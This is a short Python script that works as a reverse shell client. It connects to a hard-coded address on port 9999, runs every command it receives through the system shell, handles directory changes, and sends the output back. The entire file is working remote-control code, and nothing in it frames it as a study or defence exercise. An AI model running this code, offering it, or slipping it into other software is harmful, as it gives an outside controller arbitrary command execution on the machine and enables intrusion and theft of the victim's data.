# dependencies
import socket
import subprocess
import os

# variables
sock = socket.socket()
host = '192.168.0.222' # 192.168.0.102
port = 9999


# functions
## connect the socket using host and port
def connect_socket():
    sock.connect((host, port))


def command_listener():
    while True:
        data = sock.recv(1024)
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, 'utf-8')
            current_working_directory = os.getcwd() + '> '
            sock.send(str.encode(output_str + current_working_directory))

            print(output_str)


## main
def main():
    connect_socket()
    command_listener()


# run
if __name__ == '__main__':
    main()
